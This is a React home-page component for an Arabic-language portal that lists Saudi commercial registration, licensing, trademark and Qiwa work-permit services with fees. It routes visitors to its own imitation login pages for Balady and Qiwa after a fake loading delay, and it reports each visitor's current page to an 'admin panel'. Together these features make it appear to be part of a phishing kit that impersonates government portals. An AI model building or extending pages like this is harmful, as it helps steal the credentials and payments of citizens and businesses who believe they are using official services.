import Header from "@/components/layout/Header";
import Footer from "@/components/layout/Footer";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { FileText, Plus, Search, Settings, User } from "lucide-react";
import { useLocation } from "wouter";
import { useState, useEffect } from "react";
import { Loader2 } from "lucide-react";
import { updatePage } from "@/lib/store";

export default function HomeNew() {
  const [, setLocation] = useLocation();
  const [loadingService, setLoadingService] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [tappedService, setTappedService] = useState<number | null>(null);

  // Update page name in admin panel
  useEffect(() => {
    updatePage("الصفحة الرئيسية");
  }, []);

  const services = [
    { 
      name: "قيد سجل تجاري", 
      desc: "إصدار سجل تجاري جديد لمؤسسة فردية", 
      fullDesc: "خدمة إلكترونية تقدمها وزارة التجارة عبر منصة المركز السعودي للأعمال، تتيح للمستفيدين البدء في مُمارسة النشاط التجاري، دون الحاجة إلى زيارة مراكز الخدمة.",
      fee: "500",
      icon: "🏢", 
      link: "/service/new-cr",
      serviceId: "new-cr"
    },
    { 
      name: "تجديد سجل تجاري", 
      desc: "تجديد صلاحية السجل التجاري القائم", 
      fullDesc: "خدمة إلكترونية تقدمها وزارة التجارة عبر منصة المركز السعودي للأعمال، تتيح للمستفيدين تجديد السجل التجاري، دون الحاجة إلى زيارة مراكز الخدمة.",
      fee: "200",
      icon: "🔄", 
      link: "/service/renew-cr",
      serviceId: "renew-cr"
    },
    { 
      name: "حجز اسم تجاري", 
      desc: "حجز اسم تجاري جديد قبل إصدار السجل", 
      fullDesc: "خدمة إلكترونية تقدمها وزارة التجارة عبر منصة المركز السعودي للأعمال، تتيح للمستفيدين حجز اسم تجاري، خلال مدة أقصاها (60) يومًا؛ لحين إصدار السجل التجاري ودون الحاجة إلى زيارة مراكز الخدمة.",
      fee: "100",
      icon: "abc", 
      link: "/service/reserve-name",
      serviceId: "reserve-name"
    },
    { 
      name: "تعديل سجل تجاري", 
      desc: "تعديل بيانات السجل التجاري الحالي", 
      fullDesc: "خدمة إلكترونية تقدمها وزارة التجارة عبر منصة المركز السعودي للأعمال، تتيح للمستفيدين تعديل بيانات السجل التجاري الحالي، دون الحاجة إلى زيارة مراكز الخدمة.",
      fee: "200",
      icon: "✏️", 
      link: "/service/edit-cr",
      serviceId: "edit-cr"
    },
    { 
      name: "مستخرج سجل تجاري / الإفادة التجارية", 
      desc: "الحصول على مستخرج رسمي لبيانات السجل التجاري", 
      fullDesc: "خدمة إلكترونية تقدمها وزارة التجارة عبر منصة المركز السعودي للأعمال، تتيح للمستفيدين طلب مستخرج يحتوي على معلومات أي سجل تجاري، كما تتيح له التقديم على طلب إفادة عن إجراء معين؛ بهدف الحصول على مستند يتضمن تأكيدًا من الوزارة بحدوث هذا الإجراء.",
      fee: "100",
      icon: "📄", 
      link: "/service/commercial-extract",
      serviceId: "commercial-extract"
    },
    { 
      name: "شطب سجل تجاري", 
      desc: "إلغاء السجل التجاري لمؤسسة فردية", 
      fullDesc: "خدمة إلكترونية تقدمها وزارة التجارة عبر منصة المركز السعودي للأعمال، تتيح للمستفيدين إلغاء السجل التجاري لمؤسسة فردية عند الانتهاء من ممارسة النشاط التجارية، دون الحاجة إلى زيارة مراكز الخدمة.",
      fee: "100",
      icon: "🗑️", 
      link: "/service/delete-cr",
      serviceId: "delete-cr"
    },
    { 
      name: "إصدار رخصة تجارية", 
      desc: "إصدار رخصة لمزاولة النشاط التجاري", 
      fullDesc: "خدمة إلكترونية تقدم في منصة بلدي يمكن من خلالها البدء بممارسة العمل التجاري من خلال إصدار رخصة نشاط تجاري بالإضافة إلى تصريح السلامة الصادر من المديرية العامة للدفاع المدني لجميع الأنشطة التجارية المعتمدة.",
      fee: "5,000",
      icon: "📜", 
      link: "/service/issue-license",
      serviceId: "issue-license"
    },
    { 
      name: "تجديد رخصة تجارية", 
      desc: "تجديد صلاحية الرخصة التجارية المنتهية", 
      fullDesc: "من خلال هذه الخدمة الإلكترونية يمكنك تعزيز استمرارية عملك التجاري حيث تمكنك هذه الخدمة من تجديد رخصتك التجارية، كما يمكنك تجديد مع تعديل بيانات الرخصة.",
      fee: "800",
      icon: "🔄", 
      link: "/service/renew-license",
      serviceId: "renew-license"
    },
    { 
      name: "تسجيل علامة تجارية", 
      desc: "تسجيل وحماية العلامة التجارية الخاصة بك", 
      fullDesc: "خدمة تقدم الكترونيا تتيح للمستخدم طلب تسجيل العلامة التجارية. العلامات التجارية هي الإبداعات التي تكون على شكل أسماء، كلمات، إمضاءات، حروف، رموز، وأرقام، عناوين، وأختام، وكذلك التصميمات والرسوم والصور.",
      fee: "7,500",
      icon: "®️", 
      link: "/service/register-trademark",
      serviceId: "register-trademark"
    },
    { 
      name: "تجديد رخص العمل", 
      desc: "تجديد رخص العمل للعمالة الوافدة", 
      fullDesc: "خدمة إلكترونية تقدمها وزارة الموارد البشرية والتنمية الاجتماعية عبر منصة قوى، تتيح لأصحاب المنشآت تجديد رخص العمل للعمالة الوافدة بشكل إلكتروني.",
      fee: "100",
      icon: "👷", 
      link: "/qiwa-login?service=تجديد رخص العمل",
      serviceId: "renew-work-permit"
    },
    { 
      name: "توثيق العقود", 
      desc: "توثيق العقود التجارية والإلكترونية", 
      fullDesc: "خدمة إلكترونية تقدمها وزارة الموارد البشرية والتنمية الاجتماعية عبر منصة قوى، تتيح لأصحاب المنشآت توثيق العقود التجارية والإلكترونية بشكل رسمي.",
      fee: "100",
      icon: "📝", 
      link: "/qiwa-login?service=توثيق العقود",
      serviceId: "contract-documentation"
    },
  ];

  const filteredServices = services.filter(service => 
    service.name.includes(searchQuery) || service.desc.includes(searchQuery)
  );

  const handleGetService = (e: React.MouseEvent, service: typeof services[0]) => {
    e.stopPropagation();
    if (!service.link) return;
    setLoadingService(service.name);
    
    // Save service name for later use
    localStorage.setItem('selectedService', service.name);
    
    setTimeout(() => {
      // License services go to balady, Qiwa services go to qiwa-login, others go to login
      if (service.serviceId === 'issue-license' || service.serviceId === 'renew-license') {
        setLocation(`/balady?service=${encodeURIComponent(service.name)}`);
      } else if (service.link.startsWith('/qiwa-login')) {
        setLocation(service.link);
      } else {
        setLocation(`/login?service=${encodeURIComponent(service.name)}`);
      }
      setLoadingService(null);
    }, 3000);
  };

  const handleServiceDetails = (e: React.MouseEvent, service: typeof services[0]) => {
    e.stopPropagation();
    // Navigate to the service details page
    if (service.link.startsWith('/qiwa-login')) {
      // For Qiwa services, go to a generic service page or the qiwa login
      setLocation(service.link);
    } else {
      setLocation(service.link);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl">
      <Header searchQuery={searchQuery} setSearchQuery={setSearchQuery} />
      
      <main className="flex-1 container py-8">
        {/* Welcome Section */}
        <div className="bg-white rounded-lg shadow-sm p-8 mb-8 border border-gray-100">
          <div className="flex justify-between items-center">
            <div>
              <h1 className="text-2xl font-bold text-[#006C35] mb-2">مرحباً بك في بوابة الخدمات</h1>
              <p className="text-gray-600">يمكنك الآن الوصول إلى جميع الخدمات الحكومية وإدارة طلباتك بسهولة.</p>
            </div>

          </div>
        </div>



        {/* Services Cards */}
        <div>
          <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 mb-6">
            <div className="flex items-center gap-4 w-full md:w-auto">
              <h2 className="text-xl font-extrabold text-gray-900">الخدمات المتاحة</h2>
              <span className="bg-[#e6f4ea] text-[#006C35] text-xs font-bold px-3 py-1 rounded-md whitespace-nowrap">الاكثر استخداما</span>
            </div>
            <div className="relative w-full md:w-64 hidden md:block">
              <Search className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
              <input 
                type="text" 
                placeholder="بحث في الخدمات..." 
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pr-10 pl-4 py-2 border border-gray-200 rounded-md text-sm focus:outline-none focus:border-[#006C35] bg-white"
              />
            </div>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-4">
            {filteredServices.map((service, i) => (
              <div 
                key={i} 
                className="group relative bg-white rounded-xl border border-gray-200 flex flex-col items-center justify-center text-center cursor-pointer transition-all duration-300 hover:shadow-lg hover:border-[#006C35]/30 hover:-translate-y-1 min-h-[280px] overflow-hidden"
                onClick={() => setTappedService(tappedService === i ? null : i)}
              >
                {/* === Normal State (visible by default, hidden on hover/tap) === */}
                <div className={`group-hover:opacity-0 group-hover:invisible transition-all duration-300 absolute inset-0 flex flex-col items-center justify-center p-6 pb-8 ${tappedService === i ? 'opacity-0 invisible' : ''}`}>
                  {/* Icon */}
                  <div className="w-20 h-20 flex items-center justify-center mb-4">
                    <svg className="w-16 h-16" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
                      {service.link === '/service/new-cr' && (
                        <>
                          <rect x="18" y="10" width="44" height="56" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="28" y1="24" x2="52" y2="24" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="32" x2="52" y2="32" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="40" x2="44" y2="40" stroke="#2A8B6E" strokeWidth="2" />
                          <circle cx="56" cy="54" r="10" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <line x1="52" y1="54" x2="60" y2="54" stroke="#E8772E" strokeWidth="2" />
                          <line x1="56" y1="50" x2="56" y2="58" stroke="#E8772E" strokeWidth="2" />
                        </>
                      )}
                      {service.link === '/service/renew-cr' && (
                        <>
                          <rect x="18" y="10" width="44" height="56" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="28" y1="24" x2="52" y2="24" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="32" x2="52" y2="32" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="40" x2="44" y2="40" stroke="#2A8B6E" strokeWidth="2" />
                          <path d="M50 50 A8 8 0 1 1 58 58" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <polyline points="58,52 58,58 52,58" stroke="#E8772E" strokeWidth="2" fill="none" />
                        </>
                      )}
                      {service.link === '/service/reserve-name' && (
                        <>
                          <rect x="18" y="14" width="44" height="52" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <text x="40" y="48" textAnchor="middle" fontSize="22" fontWeight="bold" fill="#2A8B6E" fontFamily="serif">abc</text>
                          <circle cx="56" cy="22" r="8" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <circle cx="56" cy="22" r="2" fill="#E8772E" />
                          <line x1="53" y1="22" x2="59" y2="22" stroke="#E8772E" strokeWidth="1.5" />
                        </>
                      )}
                      {service.link === '/service/edit-cr' && (
                        <>
                          <rect x="18" y="10" width="44" height="56" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="28" y1="24" x2="52" y2="24" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="32" x2="52" y2="32" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="40" x2="44" y2="40" stroke="#2A8B6E" strokeWidth="2" />
                          <path d="M54 44 L62 52 L58 56 L50 48 Z" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <line x1="62" y1="52" x2="58" y2="56" stroke="#E8772E" strokeWidth="2" />
                        </>
                      )}
                      {service.link === '/service/commercial-extract' && (
                        <>
                          <rect x="18" y="10" width="44" height="56" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="28" y1="24" x2="52" y2="24" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="32" x2="52" y2="32" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="40" x2="52" y2="40" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="48" x2="44" y2="48" stroke="#2A8B6E" strokeWidth="2" />
                          <rect x="46" y="50" width="16" height="12" rx="2" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <line x1="49" y1="56" x2="59" y2="56" stroke="#E8772E" strokeWidth="1.5" />
                        </>
                      )}
                      {service.link === '/service/delete-cr' && (
                        <>
                          <rect x="18" y="10" width="44" height="56" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="28" y1="24" x2="52" y2="24" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="32" x2="52" y2="32" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="40" x2="44" y2="40" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="46" y1="48" x2="62" y2="64" stroke="#E8772E" strokeWidth="2.5" strokeLinecap="round" />
                          <line x1="62" y1="48" x2="46" y2="64" stroke="#E8772E" strokeWidth="2.5" strokeLinecap="round" />
                        </>
                      )}
                      {service.link === '/service/issue-license' && (
                        <>
                          <rect x="20" y="12" width="40" height="52" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <circle cx="40" cy="26" r="6" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="40" y1="32" x2="40" y2="38" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="30" y1="44" x2="50" y2="44" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="30" y1="50" x2="50" y2="50" stroke="#2A8B6E" strokeWidth="2" />
                          <path d="M52 56 L60 48" stroke="#E8772E" strokeWidth="2" />
                          <circle cx="60" cy="48" r="4" stroke="#E8772E" strokeWidth="2" fill="none" />
                        </>
                      )}
                      {service.link === '/service/renew-license' && (
                        <>
                          <rect x="20" y="12" width="40" height="52" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <circle cx="40" cy="26" r="6" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="40" y1="32" x2="40" y2="38" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="30" y1="44" x2="50" y2="44" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="30" y1="50" x2="50" y2="50" stroke="#2A8B6E" strokeWidth="2" />
                          <path d="M52 52 A7 7 0 1 1 59 59" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <polyline points="59,53 59,59 53,59" stroke="#E8772E" strokeWidth="2" fill="none" />
                        </>
                      )}
                      {service.link === '/service/register-trademark' && (
                        <>
                          <circle cx="40" cy="38" r="22" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <text x="40" y="46" textAnchor="middle" fontSize="28" fontWeight="bold" fill="#2A8B6E" fontFamily="serif">®</text>
                          <circle cx="56" cy="20" r="8" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <polyline points="53,20 55,22 59,18" stroke="#E8772E" strokeWidth="2" fill="none" />
                        </>
                      )}
                      {service.name === 'تجديد رخص العمل' && (
                        <>
                          <rect x="22" y="14" width="36" height="48" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <circle cx="40" cy="28" r="8" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <path d="M28 42 C28 36 52 36 52 42" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="28" y1="50" x2="52" y2="50" stroke="#2A8B6E" strokeWidth="2" />
                          <circle cx="56" cy="18" r="8" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <path d="M52,18 L56,18 M56,14 L56,22" stroke="#E8772E" strokeWidth="2" />
                        </>
                      )}
                      {service.name === 'توثيق العقود' && (
                        <>
                          <rect x="16" y="12" width="34" height="46" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="24" y1="24" x2="42" y2="24" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="24" y1="32" x2="42" y2="32" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="24" y1="40" x2="36" y2="40" stroke="#2A8B6E" strokeWidth="2" />
                          <path d="M44 46 L50 52 L62 38" stroke="#E8772E" strokeWidth="3" fill="none" strokeLinecap="round" strokeLinejoin="round" />
                          <circle cx="53" cy="44" r="14" stroke="#E8772E" strokeWidth="2" fill="none" />
                        </>
                      )}
                    </svg>
                  </div>
                  
                  {/* Service Name */}
                  <h3 className="font-bold text-gray-800 text-sm md:text-base leading-relaxed mb-3">{service.name}</h3>
                  
                  {/* Original hover button - now hidden, replaced by new hover state */}
                </div>

                {/* === Hover/Tap State (hidden by default, visible on hover or tap) === */}
                <div className={`opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all duration-300 absolute inset-0 flex flex-col justify-between p-5 bg-[#f0fdf4] rounded-xl ${tappedService === i ? '!opacity-100 !visible' : ''}`}>
                  {/* Top: Service Name + Description */}
                  <div className="text-right">
                    <h3 className="font-bold text-[#006C35] text-base mb-2">{service.name}</h3>
                    <p className="text-gray-700 text-xs leading-relaxed line-clamp-4">{service.fullDesc}</p>
                  </div>

                  {/* Bottom: Fee + Buttons */}
                  <div className="flex flex-col gap-2.5">
                    {/* Fee */}
                    <div className="flex items-center justify-between bg-white/70 rounded-lg px-3 py-2">
                      <span className="text-gray-600 text-xs font-medium">رسوم الخدمة</span>
                      <span className="text-[#006C35] font-bold text-sm">{service.fee} ر.س</span>
                    </div>

                    {/* Two Buttons */}
                    <div className="flex gap-2">
                      <button 
                        onClick={(e) => handleServiceDetails(e, service)}
                        className="flex-1 bg-white border-2 border-[#006C35] text-[#006C35] font-bold py-1.5 px-1.5 rounded-lg text-[10px] whitespace-nowrap hover:bg-[#006C35] hover:text-white transition-all duration-200"
                      >
                        تفاصيل الخدمة
                      </button>
                      <button 
                        onClick={(e) => handleGetService(e, service)}
                        className="flex-1 bg-[#D4621A] text-white font-bold py-1.5 px-1.5 rounded-lg text-[10px] whitespace-nowrap hover:bg-[#C05515] transition-all duration-200 flex items-center justify-center gap-1"
                      >
                        {loadingService === service.name ? (
                          <Loader2 className="w-3.5 h-3.5 animate-spin" />
                        ) : (
                          "الحصول على الخدمة"
                        )}
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
}
